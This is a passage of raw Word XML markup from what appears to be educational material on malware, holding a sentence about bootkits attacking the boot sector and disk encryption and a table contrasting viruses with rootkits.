        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>cord</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:t>VBR) or</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>boot</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>sec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-10"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>wa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-16"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>can</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>be used</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ack</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>fu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>l d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>sk</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>encry</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>ys</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>s.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="19" w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>here</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>s d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>fe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ence</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>be</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ween</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-15"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>V</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>rus</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>and Roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve">are </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>be</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ow-</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="2" w:line="280" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblInd w:w="117" w:type="dxa"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="01E0" w:firstRow="1" w:lastRow="1" w:firstColumn="1" w:lastColumn="1" w:noHBand="0" w:noVBand="0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4390"/>
        <w:gridCol w:w="4038"/>
      </w:tblGrid>
      <w:tr w:rsidR="00090D7C" w:rsidTr="002B3236">
        <w:trPr>
          <w:trHeight w:hRule="exact" w:val="334"/>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rPr>
                <w:b/>
                <w:spacing w:val="-9"/>
              </w:rPr>
              <w:t>V</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:spacing w:val="1"/>
              </w:rPr>
              <w:t>i</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>r</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>u</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>s</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rPr>
                <w:b/>
              </w:rPr>
              <w:t>Rootk</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>i</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>t</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00090D7C" w:rsidTr="002B3236">
        <w:trPr>
          <w:trHeight w:hRule="exact" w:val="336"/>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Pr</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>im</w:t>
            </w:r>
            <w:r>
              <w:t>a</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="2"/>
              </w:rPr>
              <w:t>r</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>il</w:t>
            </w:r>
            <w:r>
              <w:t>y</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="2"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:t>ru</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-2"/>
              </w:rPr>
              <w:t>n</w:t>
            </w:r>
            <w:r>
              <w:t>s as an ap</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="2"/>
              </w:rPr>
              <w:t>p</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>li</w:t>
            </w:r>
            <w:r>
              <w:t>c</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="1"/>
              </w:rPr>
              <w:t>a</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>ti</w:t>
            </w:r>
            <w:r>
              <w:t>on</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="2"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:t>proce</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>s</w:t>
            </w:r>
            <w:r>
              <w:t>s</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Pr</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>im</w:t>
            </w:r>
            <w:r>
              <w:t>a</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="2"/>
              </w:rPr>
              <w:t>r</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>il</w:t>
            </w:r>
            <w:r>
              <w:t>y</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="2"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:t>ru</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-2"/>
              </w:rPr>
              <w:t>n</w:t>
            </w:r>
            <w:r>
              <w:t>s as a pa</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="2"/>
              </w:rPr>
              <w:t>r</w:t>
            </w:r>
            <w:r>
              <w:t>t</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:t>of OS</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:r>
              <w:t>kernel</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00090D7C" w:rsidTr="002B3236">
        <w:trPr>
          <w:trHeight w:hRule="exact" w:val="334"/>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Usua</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>ll</w:t>
            </w:r>
            <w:r>
              <w:t>y</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="2"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:t>ga</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>i</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">ns </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-2"/>
              </w:rPr>
              <w:t>u</w:t>
            </w:r>
            <w:r>
              <w:t>ser</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="2"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>l</w:t>
            </w:r>
            <w:r>
              <w:t>evel</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="1"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:t>access</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Ga</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>i</w:t>
            </w:r>
            <w:r>
              <w:t>ns roo</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>t</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="1"/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:r>
              <w:t>ad</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>mi</w:t>
            </w:r>
            <w:r>
              <w:t>n</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="2"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>l</w:t>
            </w:r>
            <w:r>
              <w:t>evel</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="1"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:t>access</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00090D7C" w:rsidTr="002B3236">
        <w:trPr>
          <w:trHeight w:hRule="exact" w:val="336"/>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Does not</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:t>open backdoors</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Opens backdoors — v</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>i</w:t>
            </w:r>
            <w:r>
              <w:t>z.,</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="2"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:t>por</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>t</w:t>
            </w:r>
            <w:r>
              <w:t>, I</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-27"/>
              </w:rPr>
              <w:t>P</w:t>
            </w:r>
            <w:r>
              <w:t>, e</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="1"/>
              </w:rPr>
              <w:t>t</w:t>
            </w:r>
            <w:r>
              <w:t>c.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00090D7C" w:rsidTr="002B3236">
        <w:trPr>
          <w:trHeight w:hRule="exact" w:val="334"/>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Does not</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:t>prov</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>i</w:t>
            </w:r>
            <w:r>
              <w:t>de</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="1"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:t>any re</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>m</w:t>
            </w:r>
            <w:r>
              <w:t>o</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="1"/>
              </w:rPr>
              <w:t>t</w:t>
            </w:r>
            <w:r>
              <w:t>e ac</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="1"/>
              </w:rPr>
              <w:t>c</w:t>
            </w:r>
            <w:r>
              <w:t>ess</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Prov</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>i</w:t>
            </w:r>
            <w:r>
              <w:t>des re</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>m</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="2"/>
              </w:rPr>
              <w:t>o</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>t</w:t>
            </w:r>
            <w:r>
              <w:t>e a</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="1"/>
              </w:rPr>
              <w:t>c</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">cess </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>t</w:t>
            </w:r>
            <w:r>
              <w:t>o a</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="1"/>
              </w:rPr>
              <w:t>t</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>t</w:t>
            </w:r>
            <w:r>
              <w:t>acker</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00090D7C" w:rsidTr="002B3236">
        <w:trPr>
          <w:trHeight w:hRule="exact" w:val="336"/>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Fa</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>i</w:t>
            </w:r>
            <w:r>
              <w:t>r</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>l</w:t>
            </w:r>
            <w:r>
              <w:t>y</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="2"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">easy </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>t</w:t>
            </w:r>
            <w:r>
              <w:t>o d</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="1"/>
              </w:rPr>
              <w:t>e</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>t</w:t>
            </w:r>
            <w:r>
              <w:t>ect</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="1"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:t>and re</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>m</w:t>
            </w:r>
            <w:r>
              <w:t>ove</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rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>E</w:t>
            </w:r>
            <w:r>
              <w:t>x</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>t</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="2"/>
              </w:rPr>
              <w:t>r</w:t>
            </w:r>
            <w:r>
              <w:t>e</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>m</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="1"/>
              </w:rPr>
              <w:t>e</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>l</w:t>
            </w:r>
            <w:r>
              <w:t>y d</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="1"/>
              </w:rPr>
              <w:t>i</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-6"/>
              </w:rPr>
              <w:t>f</w:t>
            </w:r>
            <w:r>
              <w:t>f</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>i</w:t>
            </w:r>
            <w:r>
              <w:t>c</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="2"/>
              </w:rPr>
              <w:t>u</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>l</w:t>
            </w:r>
            <w:r>
              <w:t>t</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t xml:space="preserve"> t</w:t>
            </w:r>
            <w:r>
              <w:t>o</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="2"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:t>de</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>t</w:t>
            </w:r>
            <w:r>
              <w:t>e</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="1"/>
              </w:rPr>
              <w:t>c</w:t>
            </w:r>
            <w:r>
              <w:t>t</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:t>and r</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="1"/>
              </w:rPr>
              <w:t>e</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>m</w:t>
            </w:r>
            <w:r>
              <w:t>ove</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00090D7C" w:rsidTr="002B3236">
        <w:trPr>
          <w:trHeight w:hRule="exact" w:val="334"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4390"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 xml:space="preserve">Is </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>m</w:t>
            </w:r>
            <w:r>
              <w:t>ea</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="2"/>
              </w:rPr>
              <w:t>n</w:t>
            </w:r>
            <w:r>
              <w:t>t</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t xml:space="preserve"> t</w:t>
            </w:r>
            <w:r>
              <w:t>o cr</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="1"/>
              </w:rPr>
              <w:t>e</w:t>
            </w:r>
            <w:r>
              <w:t>a</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>t</w:t>
            </w:r>
            <w:r>
              <w:t>e</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="1"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:t>nu</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>i</w:t>
            </w:r>
            <w:r>
              <w:t>sance</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="1"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:t>and da</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>t</w:t>
            </w:r>
            <w:r>
              <w:t>a</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="1"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:t>da</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:spacing w:val="-1"/>
              </w:rPr>
              <w:t>m</w:t>
            </w:r>
            <w:r>
              <w:t>age</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4038" w:type="dxa"/>
            <w:tcBorders>
